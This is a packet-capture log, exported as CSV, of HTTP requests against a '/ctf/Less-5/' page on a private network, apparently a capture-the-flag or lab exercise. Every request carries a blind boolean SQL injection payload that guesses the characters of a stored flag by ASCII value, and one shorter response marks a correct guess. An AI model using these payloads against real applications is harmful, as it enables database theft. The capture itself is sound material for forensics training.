"No.","Time","Source","Destination","Protocol","Length","Info"
"17795","8.159454705","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),23,1))=59--+ HTTP/1.1 "
"17798","8.161706566","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"17807","8.164229051","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),23,1))=60--+ HTTP/1.1 "
"17810","8.166275374","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"17819","8.168469577","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),23,1))=61--+ HTTP/1.1 "
"17822","8.170518795","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"17831","8.172732973","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),23,1))=62--+ HTTP/1.1 "
"17834","8.174799455","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"17843","8.177306219","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),23,1))=63--+ HTTP/1.1 "
"17846","8.179563718","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"17855","8.182214069","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),23,1))=64--+ HTTP/1.1 "
"17858","8.184356578","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"17867","8.186662557","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),23,1))=65--+ HTTP/1.1 "
"17870","8.188805465","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"17879","8.191412732","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),23,1))=66--+ HTTP/1.1 "
"17882","8.193683364","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"17891","8.196002543","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),23,1))=67--+ HTTP/1.1 "
"17894","8.198086435","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"17903","8.200231924","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),23,1))=68--+ HTTP/1.1 "
"17906","8.202377016","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"17915","8.204533753","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),23,1))=69--+ HTTP/1.1 "
"17918","8.208122422","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"17927","8.210699865","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),23,1))=70--+ HTTP/1.1 "
"17930","8.212870446","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"17939","8.215408057","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),23,1))=71--+ HTTP/1.1 "
"17942","8.217483006","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"17951","8.220161902","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),23,1))=72--+ HTTP/1.1 "
"17954","8.222269256","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"17963","8.224810099","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),23,1))=73--+ HTTP/1.1 "
"17966","8.226854620","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"17975","8.229088281","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),23,1))=74--+ HTTP/1.1 "
"17978","8.231341558","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"17987","8.233771342","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),23,1))=75--+ HTTP/1.1 "
"17990","8.235790012","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"17999","8.238433955","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),23,1))=76--+ HTTP/1.1 "
"18002","8.240634507","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"18011","8.243086430","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),23,1))=77--+ HTTP/1.1 "
"18014","8.245187234","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"18023","8.247469051","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),23,1))=78--+ HTTP/1.1 "
"18026","8.249901249","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"18035","8.252467509","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),23,1))=79--+ HTTP/1.1 "
"18038","8.254473875","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"18047","8.257075193","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),23,1))=80--+ HTTP/1.1 "
"18050","8.259336012","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"18059","8.261914127","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),23,1))=81--+ HTTP/1.1 "
"18062","8.264319242","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"18071","8.266537741","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),23,1))=82--+ HTTP/1.1 "
"18074","8.268568552","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"18083","8.271111709","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),23,1))=83--+ HTTP/1.1 "
"18086","8.273333455","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"18095","8.275911092","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),23,1))=84--+ HTTP/1.1 "
"18098","8.278216100","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"18107","8.282249066","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),23,1))=85--+ HTTP/1.1 "
"18110","8.284454777","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"18119","8.286887752","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),23,1))=86--+ HTTP/1.1 "
"18122","8.288905736","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"18131","8.291511313","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),23,1))=87--+ HTTP/1.1 "
"18134","8.293880027","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"18143","8.296229067","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),23,1))=88--+ HTTP/1.1 "
"18146","8.298152113","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"18155","8.300124291","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),23,1))=89--+ HTTP/1.1 "
"18158","8.302293065","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"18167","8.304495013","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),23,1))=90--+ HTTP/1.1 "
"18170","8.306565906","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"18179","8.309172203","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),23,1))=91--+ HTTP/1.1 "
"18182","8.311426385","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"18191","8.314003041","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),23,1))=92--+ HTTP/1.1 "
"18194","8.316286227","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"18203","8.318512175","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),23,1))=93--+ HTTP/1.1 "
"18206","8.320635624","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"18215","8.323572331","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),23,1))=94--+ HTTP/1.1 "
"18218","8.325918947","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"18226","8.328700202","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),23,1))=95--+ HTTP/1.1 "
"18228","8.331147716","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"18235","8.333441241","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),23,1))=96--+ HTTP/1.1 "
"18238","8.335762011","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"18245","8.339064495","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),23,1))=97--+ HTTP/1.1 "
"18248","8.341138350","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"18255","8.343737766","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),23,1))=98--+ HTTP/1.1 "
"18258","8.346099228","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"18266","8.348685671","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),23,1))=99--+ HTTP/1.1 "
"18268","8.351536458","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"18275","8.354082402","192.168.246.23","192.168.246.1","HTTP","289","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),23,1))=100--+ HTTP/1.1 "
"18278","8.356587099","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"18285","8.360172536","192.168.246.23","192.168.246.1","HTTP","289","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),23,1))=101--+ HTTP/1.1 "
"18288","8.362576051","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"18311","8.366350244","192.168.246.23","192.168.246.1","HTTP","289","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),23,1))=102--+ HTTP/1.1 "
"18314","8.368892560","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"18323","8.371157657","192.168.246.23","192.168.246.1","HTTP","289","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),23,1))=103--+ HTTP/1.1 "
"18326","8.373266916","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"18335","8.375979289","192.168.246.23","192.168.246.1","HTTP","289","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),23,1))=104--+ HTTP/1.1 "
"18338","8.381190821","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"18347","8.386263577","192.168.246.23","192.168.246.1","HTTP","289","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),23,1))=105--+ HTTP/1.1 "
"18350","8.389421189","192.168.246.1","192.168.246.23","HTTP","978","HTTP/1.1 200 OK  (text/html)"
"18359","8.391850954","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),24,1))=33--+ HTTP/1.1 "
"18362","8.394347568","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"18371","8.396826708","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),24,1))=34--+ HTTP/1.1 "
"18374","8.399422851","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"18383","8.402026539","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),24,1))=35--+ HTTP/1.1 "
"18386","8.404568673","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"18395","8.407182082","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),24,1))=36--+ HTTP/1.1 "
"18398","8.409288148","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"18407","8.411871922","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),24,1))=37--+ HTTP/1.1 "
"18410","8.414163283","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"18419","8.416779208","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),24,1))=38--+ HTTP/1.1 "
"18422","8.419058041","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"18431","8.422523567","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),24,1))=39--+ HTTP/1.1 "
"18434","8.424846654","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"18443","8.427470059","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),24,1))=40--+ HTTP/1.1 "
"18446","8.429576591","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"18455","8.432237440","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),24,1))=41--+ HTTP/1.1 "
"18458","8.434330829","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"18467","8.436979338","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),24,1))=42--+ HTTP/1.1 "
"18470","8.439143328","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"18479","8.441322186","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),24,1))=43--+ HTTP/1.1 "
"18482","8.443325410","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"18491","8.445581064","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),24,1))=44--+ HTTP/1.1 "
"18494","8.447847725","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"18503","8.449985558","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),24,1))=45--+ HTTP/1.1 "
"18506","8.452032162","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"18515","8.454630725","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),24,1))=46--+ HTTP/1.1 "
"18518","8.456957426","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"18527","8.459286665","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),24,1))=47--+ HTTP/1.1 "
"18530","8.461337500","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"18539","8.463746838","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),24,1))=48--+ HTTP/1.1 "
"18542","8.466055016","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"18551","8.468684435","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),24,1))=49--+ HTTP/1.1 "
"18554","8.470925679","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"18563","8.473537114","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),24,1))=50--+ HTTP/1.1 "
"18566","8.475779304","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"18575","8.478385929","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),24,1))=51--+ HTTP/1.1 "
"18578","8.480684939","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"18587","8.483288783","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),24,1))=52--+ HTTP/1.1 "
"18590","8.485547461","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"18599","8.488140724","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),24,1))=53--+ HTTP/1.1 "
"18602","8.490261020","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"18611","8.491991838","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),24,1))=54--+ HTTP/1.1 "
"18614","8.494187357","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"18623","8.496702568","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),24,1))=55--+ HTTP/1.1 "
"18626","8.498770829","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"18635","8.501262244","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),24,1))=56--+ HTTP/1.1 "
"18638","8.503363394","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"18647","8.505823923","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),24,1))=57--+ HTTP/1.1 "
"18650","8.507850382","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"18659","8.510222044","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),24,1))=58--+ HTTP/1.1 "
"18662","8.512440907","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"18671","8.515028076","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),24,1))=59--+ HTTP/1.1 "
"18674","8.517324096","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"18683","8.519623192","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),24,1))=60--+ HTTP/1.1 "
"18686","8.521745731","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"18695","8.524080006","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),24,1))=61--+ HTTP/1.1 "
"18698","8.526227765","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"18707","8.528826299","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),24,1))=62--+ HTTP/1.1 "
"18710","8.531208741","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"18719","8.533632475","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),24,1))=63--+ HTTP/1.1 "
"18722","8.535660409","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"18731","8.538096181","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),24,1))=64--+ HTTP/1.1 "
"18734","8.540194034","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"18743","8.543047120","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),24,1))=65--+ HTTP/1.1 "
"18746","8.545160522","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"18753","8.547768461","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),24,1))=66--+ HTTP/1.1 "
"18756","8.550014185","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"18763","8.552430332","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),24,1))=67--+ HTTP/1.1 "
"18770","8.554516479","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"18779","8.556891329","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),24,1))=68--+ HTTP/1.1 "
"18782","8.559053925","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"18791","8.561713025","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),24,1))=69--+ HTTP/1.1 "
"18794","8.563913299","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"18803","8.566515146","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),24,1))=70--+ HTTP/1.1 "
"18806","8.568862803","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"18815","8.571534030","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),24,1))=71--+ HTTP/1.1 "
"18818","8.573733117","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"18827","8.576248794","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),24,1))=72--+ HTTP/1.1 "
"18830","8.578521628","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"18839","8.581151404","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),24,1))=73--+ HTTP/1.1 "
"18842","8.583330349","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"18851","8.585982287","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),24,1))=74--+ HTTP/1.1 "
"18854","8.588301838","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"18863","8.590875087","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),24,1))=75--+ HTTP/1.1 "
"18866","8.593077183","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"18875","8.595379192","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),24,1))=76--+ HTTP/1.1 "
"18878","8.597525503","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"18887","8.599809047","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),24,1))=77--+ HTTP/1.1 "
"18890","8.601901320","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"18899","8.604136435","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),24,1))=78--+ HTTP/1.1 "
"18902","8.606240525","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"18911","8.608580903","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),24,1))=79--+ HTTP/1.1 "
"18914","8.610662485","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
